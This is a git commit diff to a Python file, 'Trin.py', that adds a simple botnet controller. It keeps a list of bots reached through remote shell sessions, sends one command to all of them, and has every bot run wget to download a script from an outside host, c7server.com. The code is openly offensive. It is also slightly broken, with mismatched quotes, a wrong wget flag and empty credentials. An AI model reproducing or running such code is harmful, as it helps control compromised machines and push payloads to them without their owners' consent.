f25e3fa5f2d5000058e66a2847fdd97390ed826c
Anonymous Development <64503833+AnonymousDevelopment@users.noreply.github.com>
2020-08-28 19:11:41 +0000

    Update Trin.py

--- Trin.py
+++ Trin.py
@@ -33,3 +33,37 @@ def send_command(self, cmd)
     self.session.sendline(cmd)
     self.session.prompt()
     return self.session.before
+
+# Friday, Aug 18th
+
+#send Command to all bots in the Network 
+
+def command_bots(command):
+    for bot in botnet:
+        attack = bot.send_command(command)
+        print('Output from' + bot.host)
+        print(attack)
+        
+
+#  list of bots in the network
+
+botnet=[]
+
+
+#Add new  bots 
+
+def add_bot(host, user, password):
+    new_bot = Bot(host, user, password)
+    botnet.append(new_bot)
+    
+add_bot('', '', '')
+
+
+#list users home directory
+command_bots('ls')
+
+#download script files 
+
+command_bots(""""wget -0 /Users/Owner/Desktop/ "http://c7server.com/script.py"""")
+
+
